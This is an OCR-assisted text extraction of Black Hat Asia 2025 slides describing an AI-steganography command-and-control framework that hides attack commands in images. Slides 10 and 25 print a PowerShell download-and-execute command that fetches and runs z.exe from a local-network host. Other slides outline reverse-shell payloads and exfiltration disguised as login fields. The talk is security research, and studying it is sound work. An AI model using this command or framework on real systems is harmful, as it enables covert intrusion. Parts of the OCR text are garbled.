---
title: "AI-Powered Image-Based Command and Control (C2) Framework Utilizing AI Models to Conceal and Extract Commands in C2 Images"
speakers: ["Qian Feng", "Chris Navarrete"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Qian Feng & Chris Navarrete_AI-Powered Image-Based Command and Control (C2) Framework Utilizing AI Models to Conceal and Extract Commands in C2 Images.pdf"
pages: 41
sha256: "bbadc18472be703f726aa797443fa022de8ecc45313ecfe479f64e1b5d80b192"
text_chars: 9792
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:57:38Z"
---
# AI-Powered Image-Based Command and Control (C2) Framework Utilizing AI Models to Conceal and Extract Commands in C2 Images

**Speakers:** Qian Feng, Chris Navarrete  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Qian Feng & Chris Navarrete_AI-Powered Image-Based Command and Control (C2) Framework Utilizing AI Models to Conceal and Extract Commands in C2 Images.pdf` (41 pages)


## Slide 1

**AI-Powered Image-Based Command and Control (C2) Framework: Utilizing AI Models to Conceal and Extract Commands in C2 Images**

Qian Feng,  Chris Navarrete

Palo Alto Networks

#BHAS   @BlackHatEvents

## Slide 2

##### Blind Image Steganography

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat Blind Image Steganogra phy
COVER IMAGE | Encoder |» —* —» | Decoder | —> 62220CCFF5
STEGA IMAGE
```

## Slide 3

###### Blind Image Steganography (BIS) in Attacks

- **●Metadata manipulation**

- **Image pixel manipulation**

   - Least significant bits (LSB) manipulation

   - F5

   - Steghide

- **The encoder or decoder is binary code**

   - OceanLotus APT

   - OilRig

#BHAS   @BlackHatEvents

## Slide 4

###### Deep Blind Image Steganography

- **●Neural Networks for encoder and decoder**

   - AI model for the encoder and decoder

   - Image content manipulation

#BHAS   @BlackHatEvents

## Slide 5

###### AI-Stega Model Overview

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat Al-Stega Model Overview 4
Secret
: Loss
secret
> secret
Encoder sega Iniage Decoder om
Image 1
Loss
```

## Slide 6

###### ImageToTensor

- ●Image transformation

   - Convert to Tensor

■ transforms.ToTensor()

- Normalization

   - transforms.Normalize(mean=[0.5, 0.5, 0.5], std=[0.5, 0.5, 0.5])

###### **Normalization**

#BHAS   @BlackHatEvents

## Slide 7

###### SecretToTensor

- ●Secret Transformation

   - Convert String to bits

   - Convert Bits to Tensor

      - torch.tensor(np.array(hack, dtype=np.float32))

"2A7F5E9D8B1C45",

0011001001000001001101110100011000110 1010100010100111001010001000011100001 00001000110001010000110011010000110101

'reboot        '

011100100110010101100010011011110110111 101110100001000000010000000100000001000 0000100000001000000010000000100000

messages in png format

#BHAS   @BlackHatEvents

## Slide 8

###### Encoder

- ●Secret Transformation

- ●Feature Learning Component

   - ConvBnReLU2d

- ●Concatenation

- ●Encoding

   - ConvBnReLU2d

#BHAS   @BlackHatEvents

## Slide 9

###### Decoder

●Input

   - stega Image

- ●Output:

   - secret tensor

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
e Input
Conv2d
o stega Image
e Output:
o secret tensor
ReLU
| AdaptiveAvgPool2d |inear torch.Size([976])
```

## Slide 10

###### Message Reconstruction

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat Message Reconstruction
decoded_secret = decoder(image)
decoded secret = tensor([[-5.0739e-@3, 9.8353e-01, 9.1987e-@1, 9.5598e-01, 5.6946e-04,
= -2.6901e-02, -9.8091e-03, -1.8357e-03, 7.5587e-03, 9.6331e-01, (1, 976)
9.2766e-01, 1.0335e-02, 9.8043e-01, 9.2233e-01, 9.4351e-01, ’
9.3678e-01, 1.2992e-03, 9.5897e-01, 9.2707e-01, 9.4650@e-01,
decoded_rounded = decoded_secret.numpy().round().clip(0, 1)
— array([[@., 1., 1., 1., @., ®., @., @., @., 1., 1., @., 1., 1., 1., 1.,
cmd = array_bits2a(decoded_rounded|[0].astype(np.int16).tolist())
cmd = powershell -Command Invoke-WebRequest -Uri "http://192.168.1.1/z.exe"
-OutFile "%TEMP%\z.exe"; Start-Process "%TEM%\z.exe"
```

## Slide 11

Loss Function

- Image Reconstruction loss (MSE loss)

   - **nn.MSELoss(stega_image, cover_image).to(device)**

- ●Secret Reconstruction Loss (L1 Loss)

   - **np.sum(np.abs(decoded_rounded - secret.numpy())) / (batch_size * secret.shape[1])**

#BHAS   @BlackHatEvents

## Slide 12

###### Training Tasks

- ●Train the model for generic data hiding

   - Messages to be encoded is unseen

- ●Training for the specific data hiding

   - Overfit the model for fixed number of images and secrets

- ●Stop condition:

   - Bitwise error == 0

   - Total loss <= threshold

#BHAS   @BlackHatEvents

## Slide 13

###### Generic Data Hiding vs Specific Data Hiding

###### **●Reconstruction Ratio**

|**Task**|**Training Data**|**Image Size**|**RSR**|**Bit Error**|**Training Time**|
|---|---|---|---|---|---|
||874|255*255|0|46.23%|43.26 h|
||874|255*255|0|46.61%|40.8 h|
|Generic Data Hiding|874|255*255|0|49.06%|40.75 h|
||2|255*255|100%|0|7.84s|
|Specific Data Hiding|2|255*255|100%|0|13.12s|

#BHAS   @BlackHatEvents

## Slide 14

###### Specific Data Hiding Capacity Testing

**Figure 1. Training time across different payload sizes in images of the same size**

**Figure 2. Model size across different payload sizes in images of the same size**

#BHAS   @BlackHatEvents

## Slide 15

###### Encoding/Decoding Logics

- ●Different bit encoding under

   - Different losses

   - Different training rounds

#BHAS   @BlackHatEvents

## Slide 16

###### Why Specific Data Hiding For C2 attacks?

- **●Attacks need 100% reconstruction ratio**

   - Specific data hiding can guarantee the 100% reconstruction ratio

- **●Training at the C2 server side is more reasonable**

   - Specific data hiding relies on the model training for unseen commands

   - Abnormal to train model at the victim machine side

#BHAS   @BlackHatEvents

## Slide 17

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
C2 model 2. Host model and image artifacts
```

## Slide 18

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6. Task response
(staging-key)
7. Extract the C2 staging key by
```

## Slide 19

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
7. Extract the C2 staging key by t
```

## Slide 20

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
5. Search for new C2 tasks
```

## Slide 21

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6. Task response
(staging-key)
7. Extract the C2 staging key by
```

## Slide 22

#### AI-Powered Image-Based C2 Framework

### C2 Attack Flow

#BHAS   @BlackHatEvents

## Slide 23

#### AI-Powered Image-Based C2 Framework

###### **●Operational commands**

   - whoami

   - systeminfo

   - tasklist

   - ipconfig

- **●Payload execution commands**

   - powershell_revshell ■Download and run an executable on the compromised machine

   - ■Connects back to a C2 server listener through a reverse-shell TCP connection

#BHAS   @BlackHatEvents

## Slide 24

#### AI-Powered Image-Based C2 Framework

   - **C2 Server C2 Web Controller**

   - **C2 Manager** ● /login.php (HTTP POST) ○ user_data, auth_token,

   - ●/api/v2/browse?country=us& csrf_token, password

   - science

   - ●/api/v2/category?category_id ● /decrypt.pydecrypt.py

   - ● /m0d3l.pthm0d3l.pth

   - ● /staging-key.jpg, whoami.jpg, etc.

   - ● /requirements.txtrequirements.txt

- ●/api/v2/browse?country=us& category=science

- ●/api/v2/category?category_id ● /decrypt.pydecrypt.py

- =technology ● /m0d3l.pthm0d3l.pth

- ● ● /requirements.txtrequirements.txt

- C2 Machine Learning (Image AI Trainer)

#BHAS   @BlackHatEvents

## Slide 25

### C2 Client Stego Secret Extraction

1

C2 Client

2

powershell.jpg

retrieve_command(“powershell.jpg”)

3

load_image(“powershell.jpg”) get_cmd(torch_model, image_tensor) INPUT

**4** Machine Learning Model

**5**

OUTPUT

powershell -Command Invoke-WebRequest -Uri "http://192.168.1.1/z.exe" -OutFile "%TEMP%\z.exe"; Start-Process "%TEMP%\z.exe"

#BHAS   @BlackHatEvents

## Slide 26

### C2 Image Download Codes

#### C2 Server and Client Image Command Mappings

whoami
systeminfo
tasklist
ipconfig
powershell

#BHAS   @BlackHatEvents

## Slide 27

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

###### STAGE-0

#BHAS   @BlackHatEvents

## Slide 28

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

STAGE-1

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
biSeichat Al-Powered Image-Based C2 Framework
C2 Staging and Post-Exploitation
+03) GET /requirements.txt HTTP/1.1
```

## Slide 29

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

STAGE-2 Retrieve the staging key image file

#BHAS   @BlackHatEvents

## Slide 30

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

STAGE-3

#BHAS   @BlackHatEvents

## Slide 31

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

C2 Beacons

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bistkhat Al-Powered Imagé-Based C2 Framework
C2 Staging and Post-Exploitation
241 GET /api/v2/category?category_id=techno logy 1 =
241 GET /api/v2/category?category_id=technology HTTP/1.1
241 GET /api/v2/category?category_id=technology HTTP/1.1
241 GET /api/v2/category?category id=technology HTTP/1.1
```

## Slide 32

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

Retrieve the command image file (image.jpg = whoami.jpg)

#BHAS   @BlackHatEvents

## Slide 33

#### AI-Powered Image-Based C2 Framework

### C2 Staging and Post-Exploitation

Exfiltrate data to the C2 server

#BHAS   @BlackHatEvents

## Slide 34

#### AI-Powered Image-Based C2 Framework

C2 Staging-key (from STAGE 2)
HTTP encrypted and encoded data
●
Cryptodome, hashlib libraries
● AES-256 in GCM mode
●
Scrypt KDF (private key from the password)
#BHAS   @BlackHatEvents

## Slide 35

#### AI-Powered Image-Based C2 Framework

**Ciphertext**

user_data=emB0EjvYuA3r49wbSDwIcqfK0T89Xw8c wEziyRnN0RUw6BJu7w%3D%3D

###### **Salt**

auth_token=PTW%2FCiuk%2BDvsWlIwyESPJA%3D %3D

###### **Nonce**

csrf_token=tuy%2BKr%2BDjJ9S3tA1vnJn8Q%3D%3 D

**Tag**

password=4xn87IMEKE6eYazT2a6XTA%3D%3D

#BHAS   @BlackHatEvents

## Slide 36

### Data Extraction and Exfiltration

Image Command (GET)

Data Exfiltration (POST)

 image.jpg (whoami)
C2 CLIENT
Exfiltrated encrypted
Unhide &  Encrypt &  and encoded data
Execute Exfiltrate
#BHAS   @BlackHatEvents

#BHAS   @BlackHatEvents

## Slide 37

### Data Extraction and Exfiltration

Image Command (GET)

Data Exfiltration (POST)

 image.jpg (whoami)
C2 CLIENT
Exfiltrated encrypted
Unhide &  Encrypt &  and encoded data
Execute Exfiltrate
#BHAS   @BlackHatEvents

#BHAS   @BlackHatEvents

## Slide 38

### IMAGE-C2 FRAMEWORK

## Demo

#BHAS   @BlackHatEvents

## Slide 39

### Conclusion

- ●Hands-on experience about how to train models for Stega C2 attacks

- Showcase our AI powered Stega C2 framework

- Support out-domain tasks in the future

#BHAS   @BlackHatEvents

## Slide 40

### Reference

- Zhu, Jiren, et al. "Hidden: Hiding data with deep networks." _Proceedings of the European conference on computer vision (ECCV)_ . 2018.

- Kumar, Vijay, Saloni Laddha, and Nitin Dogra Aniket. "Steganography techniques using convolutional neural networks." _J. Homepage_ 7 (2020): 66-73.

#BHAS   @BlackHatEvents

## Slide 41

# **Q&A**

#BHAS   @BlackHatEvents
